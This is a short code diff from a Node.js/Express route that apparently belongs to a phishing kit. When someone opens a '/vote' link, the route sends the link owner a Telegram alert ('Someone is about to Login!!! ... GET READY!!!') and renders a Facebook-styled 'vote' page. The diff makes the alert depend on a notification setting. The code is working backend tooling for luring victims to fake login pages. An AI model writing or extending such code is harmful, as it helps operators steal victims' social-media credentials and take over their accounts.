@@ -16,16 +16,18 @@ router.get("/vote/:linkId", async (req, res) => {
             return res.redirect("/notfound");
         }
         const user = await User.findById(link.user);
-        await bot.sendMessage(user.telegramID, `
+        if (user.notification) {
+            await bot.sendMessage(user.telegramID, `
 😈 New Entry 😈
-
+            
 Someone is about to Login!!!
 
 SOCIAL MEDIA: ${link.linkType}
 
 GET READY!!!
-
-        `)
+            
+                    `)
+        }
         return res.render("socials/facebook/vote", { req, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
     } catch (err) {
         console.log(err)
